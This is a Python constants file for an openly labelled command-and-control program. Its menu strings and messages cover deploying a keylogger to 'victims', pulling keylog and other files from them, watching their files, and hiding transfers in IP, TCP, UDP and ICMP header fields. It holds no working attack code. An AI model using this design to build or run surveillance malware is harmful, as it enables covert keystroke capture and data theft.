ZERO = 0
MIN_PORT_RANGE = 0
MAX_PORT_RANGE = 65536
LOCAL_HOST = "localhost"
LOCAL_HOST_VALUE = "127.0.0.1"
MIN_QUEUE_SIZE = 5
CLIENT_LIST_INITIAL_SIZE = 1
NEW_CONNECTION_MSG = "[+] NOTICE: There is a new client that has connected ({})"
THREAD_START_MSG = "[+] THREAD STARTED: The following thread has started: {}"
THREAD_STOPPING_MSG = "[+] STOP THREAD: Now stopping the following thread {}..."
THREAD_STOPPED_MSG = "[+] THREAD STOPPED: Thread has finished execution!"
KEYBOARD_INTERRUPT_MSG = "[+] CTRL + C PRESSED: Processing keyboard interrupt..."

# MENU Constants
OPENING_BANNER = "===================================== || COMMANDER PROGRAM || ====================================="
MENU_CLOSING_BANNER = ("==================================================================================="
                       "===============")
SERVER_INFO_MSG = "[+] Commander server is listening on (IP: {} Port: {})"
INVALID_INPUT_MENU_ERROR = "[+] ERROR: Invalid input was provided to menu: {}"
INITIAL_VICTIM_IP_MSG = "[+] Victim IP (from argument): {}"
INITIAL_VICTIM_PORT_MSG = "[+] Victim Port (from argument): {}"
INITIATE_VICTIM_CONNECTION_MSG = "[+] Now initiating a connection to the victim..."
SUCCESSFUL_VICTIM_CONNECTION_MSG = "[+] Successfully connected to a victim: {}"
ERROR_VICTIM_CONNECTION_MSG = "[+] ERROR: A connection error to victim has occurred: {}"
MENU_SELECTION_PROMPT_MSG = "[+] Enter any number above to perform any of the following actions displayed: "
INVALID_MENU_SELECTION_PROMPT = "\n[+] INVALID INPUT: Please enter a valid option: "
COMMANDER_SERVER_SOCKET_CREATION_ERROR_MSG = "[+] ERROR: An error has occurred while creating server socket: {}"
MENU_ITEM_ONE = "1 - Start Keylogger"
MENU_ITEM_TWO = "2 - Stop Keylogger"
MENU_ITEM_THREE = "3 - Transfer Keylog Program to Victim"
MENU_ITEM_FOUR = "4 - Get Keylog File from Victim"
MENU_ITEM_FIVE = "5 - Disconnect from Victim"
MENU_ITEM_SIX = "6 - Transfer a file to a Victim"
MENU_ITEM_SEVEN = "7 - Get a file from a Victim"
MENU_ITEM_EIGHT = "8 - Run program"
MENU_ITEM_NINE = "9 - Watch file"
MENU_ITEM_TEN = "10 - Watch directory"
MENU_ITEM_ELEVEN = "11 - Stop Watching File"
MENU_ITEM_TWELVE = "12 - Stop Watching Directory"
MENU_ITEM_THIRTEEN = "13 - Get List of All Connected Victim(s)"
MENU_ITEM_FOURTEEN = "14 - Connect to a Specific Victim"
MENU_ITEM_FIFTEEN = "15 - Uninstall"
PERFORM_MENU_ITEM_ONE = 1
PERFORM_MENU_ITEM_TWO = 2
PERFORM_MENU_ITEM_THREE = 3
PERFORM_MENU_ITEM_FOUR = 4
PERFORM_MENU_ITEM_FIVE = 5
PERFORM_MENU_ITEM_SIX = 6
PERFORM_MENU_ITEM_SEVEN = 7
PERFORM_MENU_ITEM_EIGHT = 8
PERFORM_MENU_ITEM_NINE = 9
PERFORM_MENU_ITEM_TEN = 10
PERFORM_MENU_ITEM_ELEVEN = 11
PERFORM_MENU_ITEM_TWELVE = 12
PERFORM_MENU_ITEM_THIRTEEN = 13
PERFORM_MENU_ITEM_FOURTEEN = 14
PERFORM_MENU_ITEM_FIFTEEN = 15
MIN_MENU_ITEM_VALUE = 1
MAX_MENU_ITEM_VALUE = 15
BYTE_LIMIT = 1024
MIN_BUFFER_SIZE = 200
MENU_ACTION_START_MSG = "\n[+] ACTION SELECTED: Now performing menu item {}:"
RETURN_MAIN_MENU_MSG = "[+] Now returning to main menu..."
DOWNLOADS_DIR = "downloads"
INVALID_MENU_SELECTION = "[+] MENU SELECTION: Please enter a valid menu option (0 to 15)..."
BINARY_MODE = "08b"

# GENERAL CONSTANTS
CLIENT_LIST_EMPTY_ERROR = ("[+] ERROR: The command server is not connected to any clients! (TIP: Consider using "
                           "menu item 12)")
CLIENT_RESPONSE = "[+] Client says: {}"

# MENU ITEM 1 - Start Keylogger constants
START_KEYLOG_INITIAL_MSG = "[+] [MENU ITEM 1] - Now starting keylogger on the client/victim side..."
START_SEND_SIGNAL_MSG = ("[+] SENDING SIGNAL: Sending a signal to get client/victim to check if they have {}"
                         " installed... ({}, {})")
START_SIGNAL_RECEIVED_MSG = "[+] SIGNAL RECEIVED: Client/victim is now checking if {} is installed on their machine..."
START_SIGNAL_SEND_FILE_NAME = "[+] SENDING DATA: Now sending file name {} to victim/client..."
AWAIT_START_RESPONSE_MSG = "[+] Awaiting response..."
START_KEYLOG_MSG = "START"
CHECK_KEYLOG = "CHECK"
KEYLOG_FILE_CHECK_ERROR = "[+] ERROR: An error has occurred while checking if client/victim has {} : {}"
STATUS_TRUE = "TRUE"
STATUS_FALSE = "FALSE"
START_SIGNAL_EXECUTE_KEYLOG = "[+] SENDING SIGNAL: Sending a signal to client/victim to execute {}"
MISSING_KEYLOG_FILE_SUGGEST_MSG = ("[+] TIP: Enter the number 3 to initiate a transfer of the keylog "
                                   "file to client/victim")
KEYLOG_OPERATION_SUCCESSFUL = "[+] OPERATION SUCCESSFUL: Keylog file saved on client/victim device!"
KEYLOG_ERROR_MSG = "[+] ERROR: An error has occurred during the execution of keylogger: {}"
KEYLOG_STATUS_TRUE_ERROR = "[+] This specific client (IP: {}, Port: {}) is already running the keylogger program!"
KEYLOG_STATUS_TRUE_ERROR_SUGGEST = "[+] TIP: Stop the keylogger for this specific client using menu item 2"
STOP_KEYLOG_SUGGESTION_MSG = ("[+] TIP: To save and record keystrokes for this client (IP: {}, Port: {}), select "
                              "menu item 2 (Stop Keylogger) after return to main menu")
ENTER_TARGET_IP_START_KEYLOG = "[+] Enter victim IP address to start keylogger program on: "
ENTER_TARGET_PORT_START_KEYLOG = "[+] Enter victim port to start keylogger program on: "

# MENU ITEM 2 - Stop Keylogger constants
STOP_KEYLOG_INITIAL_MSG = "[+] [MENU ITEM 2] - Now stopping keylogger on the client/victim side..."
STOP_KEYLOGGER_MENU_PROMPT = ("[+] ERROR: This option can only be called when starting a keylogger (menu option 1) "
                              "on victim/client")
STOP_KEYWORD = "STOP"
STOP_KEYLOGGER_PROMPT = "[+] Enter the number 2 to 'Stop Keylogger': "
INVALID_INPUT_STOP_KEYLOGGER = "[+] INVALID INPUT: Please try again: "
STOP_KEYLOG_RESULT_ERROR = "[+] ERROR: An error has occurred during the keylogging process : {}"
STOP_KEYLOG_STATUS_FALSE = ("[+] STOP KEYLOG ERROR: Cannot stop keylogger for this specific client (IP: {}, "
                            "Port: {}) as they're currently not running the keylogger program!")
ENTER_TARGET_IP_STOP_KEYLOG = "[+] Enter victim IP address to stop keylogger program on: "
ENTER_TARGET_PORT_STOP_KEYLOG = "[+] Enter victim port to stop keylogger program on: "

# MENU ITEM 5 - DISCONNECT Constants
DISCONNECT_FROM_VICTIM_MSG = "[+] DISCONNECTING FROM VICTIM: Now disconnecting from victim {}..."
DISCONNECT_FROM_VICTIM_SUCCESS = "[+] DISCONNECT SUCCESSFUL: Disconnection was successful!"
DISCONNECT_FROM_VICTIM_ERROR = "[+] DISCONNECT ERROR: There is no such client/victim to disconnect from!"
ENTER_TARGET_IP_DISCONNECT_PROMPT = "[+] Enter victim IP address to disconnect from: "
ENTER_TARGET_PORT_DISCONNECT_PROMPT = "[+] Enter victim port to disconnect from: "
DISCONNECT_ERROR_KEYLOG_TRUE = ("[+] DISCONNECT ERROR: Cannot disconnect from the following client (IP: {}, Port: {}) "
                                " as they're currently running a keylogger program!")

# MENU ITEM 3 - TRANSFER KEYLOG Constants
KEYLOG_FILE_NAME = "keylogger.py"
TRANSFER_KEYLOG_MSG = "GET KEYLOG"
RECEIVED_CONFIRMATION_MSG = "OK"
FILE_NAME_TRANSFER_MSG = "[+] Sending file: {}"
FILE_TRANSFER_SUCCESSFUL = "[+] FILE TRANSFER SUCCESSFUL: '{}' has been sent successfully to victim (IP: {} Port: {})"
FILE_TRANSFER_ERROR = "[+] ERROR: An error has occurred during file transfer : {}"
END_OF_FILE_SIGNAL = b"EOF"
VICTIM_ACK = "ACK"
TARGET_VICTIM_NOT_FOUND = "[+] ERROR: Target victim not found!"
ENTER_TARGET_IP_FIND_PROMPT = "[+] Enter the target (victim) IP address to transfer keylog program to: "
ENTER_TARGET_PORT_FIND_PROMPT = "[+] Enter the target (victim) port to transfer keylog program to: "
FILE_TRANSFER_NO_CONNECTED_CLIENTS_ERROR = ("[+] ERROR: Cannot transfer keylog file! : The command server is not "
                                            "connected to any clients")
FILE_TRANSFER_KEYLOG_TRUE_ERROR = ("[+] FILE TRANSFER ERROR: Cannot transfer keylog program to the following client ("
                                   "IP: {}, Port: {}) as they're currently running a keylogger program!")

# MENU ITEM 4 - GET KEYLOG FILE(S) FROM CLIENT/VICTIM Constants
TRANSFER_KEYLOG_FILE_SIGNAL = "TRANSFER FILE"
GET_KEYLOG_FILE_NO_CLIENTS_ERROR = "[+] GET_KEYLOG_FILE_ERROR: The command server is not connected to any clients"
GET_KEYLOG_FILE_KEYLOG_TRUE_ERROR = (
    "[+] GET_KEYLOG_FILE_ERROR: Cannot get recorded keylog file(s) from the following client (IP: {}, Port: {}) as "
    "they're currently running a keylogger program!")
SEND_GET_KEYLOG_SIGNAL_PROMPT = ("[+] SENDING SIGNAL: Sending signal to client/victim to "
                                 "transfer recorded keylog files...")
GET_KEYLOG_PROCESS_MSG = ("[+] SEARCHING CLIENT: Now searching client/victim (IP: {}, Port: {}) "
                          "for any potentially recorded keylog '.txt' files...")
CREATE_DOWNLOAD_DIRECTORY_PROMPT = "[+] CREATING DIRECTORY: Now creating the following directory: {}"
DIRECTORY_SUCCESS_MSG = "[+] OPERATION SUCCESS: The directory has been successfully created!"
READ_MODE = "r"
READ_BINARY_MODE = "rb"
FILE_CANNOT_OPEN_ERROR = "[+] ERROR: An error has occurred while opening {} : {}"
FILE_CANNOT_OPEN_TO_SENDER = "File has been received, but is either corrupted or not present"
RECEIVING_FILE_MSG = "[+] Receiving file: {}..."
WRITE_BINARY_MODE = "wb"
TRANSFER_SUCCESS_MSG = "[+] FILE TRANSFER SUCCESSFUL: {} has been transferred successfully!"
ENTER_TARGET_IP_GET_FILES = "[+] Enter the target (victim) IP address to receive recorded keylog files from: "
ENTER_TARGET_PORT_GET_FILES = "[+] Enter the target (victim) port to receive recorded keylog files from: "
KEYLOGGER_FILE_ENTER_TIP = ("[+] TIP: To transfer keylogger file to target/victim, when prompted, enter the following:"
                            " keylogger.py")
FILE_DNE = "FILE_DNE"

# MENU ITEM 6 - Transfer File to Victim
TRANSFER_FILE_SIGNAL = "TRANSFER"
TRANSFER_FILE_PROMPT = "[+] Enter the file path of the file that you want to send to client ({}, {}): "
TRANSFER_FILE_FOUND_MSG = "[+] FILE FOUND: The file '{}' exists!"
TRANSFER_FILE_INIT_MSG = "[+] Now transferring file: {}..."
FILE_NOT_FOUND_ERROR = "[+] FILE NOT FOUND ERROR: The file '{}' does not exist."
TRANSFER_FILE_NO_CLIENT_ERROR = "[+] ERROR: Cannot transfer file - The command server is not connected to any clients!"
FILE_TRANSFER_KEYLOG_ERROR = ("[+] FILE TRANSFER ERROR: Cannot transfer file to the following client "
                              "(IP: {}, Port: {}) as they're currently running a keylogger program!")
TRANSFER_FILE_ENTER_TARGET_IP_FIND_PROMPT = "[+] Enter the target (victim) IP address to transfer file to: "
TRANSFER_FILE_ENTER_TARGET_PORT_FIND_PROMPT = "[+] Enter the target (victim) port to transfer file to: "
GET_IPV6_MSG = "[+] Now acquiring IPv6 Address from victim/client ({}, {})"
GET_IPV6_ERROR = "[+] TRANSFER FILE ERROR: An error has occurred while getting IPv6 address from target/client!"
IPV6_OPERATION_SUCCESS_MSG = "[+] OPERATION SUCCESSFUL: Victim/Client IPv6 address and port has been found ({}, {})"
IPV6_DESTINATION_FIELD_ERROR = "[+] TRANSFER FILE ERROR: Covert IPv6 Destination Field Function disabled!"
IPV4 = "IPv4"
TCP = "TCP"

# MENU ITEM 7 - Get File from Victim
GET_FILE_SIGNAL = "GET FILE"
GET_FILE_SIGNAL_MSG = ("[+] GET FILE: Sending signal to client/victim to "
                       "get a specific file...")
GET_FILE_PROMPT = "[+] Enter the file path of the file that you want to receive from client ({}, {}): "
GET_FILE_EXIST = "EXIST"
FILE_END_OF_FILE_SIGNAL = b"EOF"
GET_FILE_ERROR = "[+] RECEIVE FILE ERROR: An error has occurred during file transfer!"
GET_FILE_NOT_EXIST_MSG = "[+] GET FILE ERROR: The following file path {} does not exist in the client ({}, {})"
PROTOCOLS_LIST = ["IPv4", "IPv6", "TCP", "UDP", "ICMP"]
MAX_PROTOCOL_CHOICE = 6
PROTOCOL_HEADER_FIELD_MAP = {
    "IPv4": ["Version", "IHL (Internet Header Length)", "DS (Differentiated Services Codepoint)",
             "Explicit Congestion Notification (ECN)", "Total Length", "Identification", "Flags",
             "Fragment Offset", "TTL (Time to Live)", "Protocol", "Header Checksum", "Source Address",
             "Destination Address"],

    "IPv6": ["Version", "Traffic Class", "Flow Label", "Payload Length", "Next Header", "Hop Limit",
             "Source Address", "Destination Address"],

    "TCP": ["Source Port", "Destination Port", "Sequence Number", "Acknowledgement Number", "Data Offset",
            "Reserved", "Flags", "Window Size", "Checksum", "Urgent Pointer", "Options"],

    "UDP": ["Source Port", "Destination Port", "Length", "Checksum"],

    "ICMP": ["Type (Type of Message)", "Code", "Checksum", "Identifier", "Sequence Number"]
}
PROTOCOL_CHOICE_PROMPT = "[+] Enter a valid integer between 1 - 5: \n"
HEADER_CHOICE_PROMPT = "[+] Enter a valid integer between 1 - {}: \n"
INVALID_PROTOCOL_ERROR_MSG = "[+] INVALID PROTOCOL FORMAT: {}"
INVALID_HEADER_ERROR_MSG = "[+] INVALID HEADER FIELD FORMAT: {}"
PROTOCOL_SELECTED_MSG = "[+] PROTOCOL SELECTED: {}"
FIELD_SELECTED_MSG = "[+] FIELD SELECTED: {}"
CHOICES_NOT_FOUND_IN_MAP_ERROR = ("[+] TRANSFER FILE ERROR: The choices chosen are not defined and not present in "
                                  "function mapping!")
CALL_MAP_FUNCTION_ERROR = "[+] TRANSFER FILE ERROR: Invalid operation while calling mapped function!"
DESTINATION_ADDRESS_ERROR = ("[+] ACTION DENIED: Performing covert file transfer in the {} field for "
                             "the {} header will cause the connection to hang!")
DESTINATION_ADDRESS_ERROR_REASON = ("[+] REASON: Data (packets) will be delivered to random spoofed "
                                    "destination IP addresses")
SOURCE_ADDRESS_FIELD = "Source Address"
DESTINATION_ADDRESS_FIELD = "Destination Address"
IPV6 = "IPv6"
UDP = "UDP"
ICMP = "ICMP"
TIMESTAMP = "Timestamp"
FIELD_SELECTION_PROMPT = "[+] Please select a field to hide data in {} header for covert file transfer..."
GET_IPV6_SCRIPT_PATH = "ipv6_getter.py"
EIGHT_BIT = "08b"
FOUR_BIT = "04b"
SIX_BIT = "06b"
TWO_BIT = "02b"
THREE_BIT = "03b"
THIRTEEN_BIT = "013b"
SIXTEEN_BIT = "016b"
THIRTY_TWO_BIT = "032b"
HUNDRED_TWENTY_EIGHT = "0128b"
NINE_BIT = "09b"
TWENTY_BIT = "020b"
APPEND_MODE = "a"
NULL_BYTE = b'\x00'
STX_BYTE = b'\x02'
INVALID_IPV6_ERROR = "[+] INVALID IPV6 ADDRESS: An error has occurred {}"
DESTINATION_PORT_FIELD = "Destination Port"
FLAG = "Flags"
SOURCE_PORT_FIELD = "Source Port"
NEXT_HEADER = "Next Header"
CLIENT_TOTAL_PACKET_COUNT_MSG = "Total Number of Packets: {}"

# MENU ITEM 9 - Watch File
START_WATCH_FILE_MSG = "[+] [MENU ITEM 9] - Now Watching File"
WATCH_FILE_NO_CLIENTS_ERROR = "[+] WATCH_FILE_ERROR: The command server is not connected to any clients!"
WATCH_FILE_SIGNAL = "WATCH FILE"
WATCH_FILE_TRANSFER_SUCCESS_MODIFY = ("[+] FILE TRANSFER SUCCESSFUL: {} has been transferred successfully "
                                      "[due to modification]")
WATCH_FILE_TRANSFER_SUCCESS_DELETION = ("[+] FILE TRANSFER SUCCESSFUL: {} has been transferred successfully "
                                        "[due to deletion]")
WATCH_STATUS_TRUE_ERROR = ("[+] WATCH_ERROR: This specific client (IP: {}, Port: {}) "
                           "is already currently watching a file or a directory!")
WATCH_STATUS_TRUE_ERROR_SUGGEST = ("[+] TIP: To stop watching a file or directory for this specific client use menu "
                                   "item 11 or 12")
NOT_WATCHING_FILE_ERROR = "[+] STOP WATCH FILE ERROR: You are not currently watching a file!"
DELETED_DIRECTORY = "deleted"
WATCH_FILE_DELETE_DETECTED_MSG = ("[+] WATCH FILE DELETE EVENT DETECTED: The watch file '{}' has been deleted on "
                                  "client/victim ({}, {})")
WATCH_FILE_THREAD_TERMINATING = ("[+] THREAD TERMINATION: Now terminating the following thread: "
                                 "Watch_File_Client_Socket Thread...")

# MENU ITEM 11 - Stop Watching File
STOP_WATCH_FILE_MSG = "[+] [MENU ITEM 11] - Now Stopping Watch File"
STOP_WATCH_FILE_NO_CLIENTS_ERROR = "[+] STOP_WATCH_FILE_ERROR: The command server is not connected to any clients!"
STOP_WATCH_FILE_TIP = ("[+] TIP: You can wait for client/victim ({}, {}) to "
                       "process STOP or press CTRL + C to go back to main menu")
STOP_WATCH_THREAD_CONCURRENCY_WARNING = ("[+] WARNING: You are not allowed to perform any actions on client/victim "
                                         "({}, {}) until they have performed one final event on the file that was "
                                         "currently being watched (i.e. Wait until Watch_File_Client_Socket thread "
                                         "has finished...)")
WATCH_FILE_THREAD_STOP = "[+] ENDING THREAD: WATCH_FILE_THREAD has terminated!"
WATCH_FILE_THREAD_STOP_SUCCESS = "[+] WATCH FILE SUCCESSFUL: You have stopped watching the file..."

# MENU ITEM 12 - Connect to a specific victim
INVALID_INPUT_ERROR = "[+] ERROR: Invalid format for either IP address or port number was provided : {}"

# DESTINATION IP/PORT Constants
NO_ARG_ERROR = "[+] NO_ARG_ERROR: No arguments were passed in!"
INVALID_DST_IP_ADDRESS_ARG_ERROR = ("[+] ERROR: Invalid format for the destination IP address was provided "
                                    "(-d option): {}")
INVALID_FORMAT_DST_PORT_NUMBER_ARG_ERROR = "[+] ERROR: Invalid format provided for the destination port (-p option): {}"
INVALID_DST_PORT_NUMBER_RANGE = ("[+] ERROR: The value provided for destination port (-p option) is not "
                                 "valid: (not between 0 and 65536)")
NO_DST_IP_ADDRESS_SPECIFIED_ERROR = "[+] ERROR: No destination IP Address (-d option) was specified!"
NO_DST_PORT_NUMBER_SPECIFIED_ERROR = "[+] ERROR: No destination port number (-p option) was specified!"

# SOURCE IP/PORT Constants
INVALID_SRC_IP_ADDRESS_ARG_ERROR = ("[+] ERROR: Invalid format for the source IP address was provided "
                                    "(-s or --src_ip option): {}")
INVALID_FORMAT_SRC_PORT_NUMBER_ARG_ERROR = ("[+] ERROR: Invalid format provided for the source port (-c or --src_port "
                                            "option): {}")
INVALID_SRC_PORT_NUMBER_RANGE = ("[+] ERROR: The value provided for source port (-c or --src_port option) is not "
                                 "valid: (not between 0 and 65536)")
NO_SRC_IP_ADDRESS_SPECIFIED_ERROR = "[+] ERROR: No source IP Address (-s or --src_ip option) was specified!"
NO_SRC_PORT_NUMBER_SPECIFIED_ERROR = "[+] ERROR: No source port number (-c or --src_port option) was specified!"
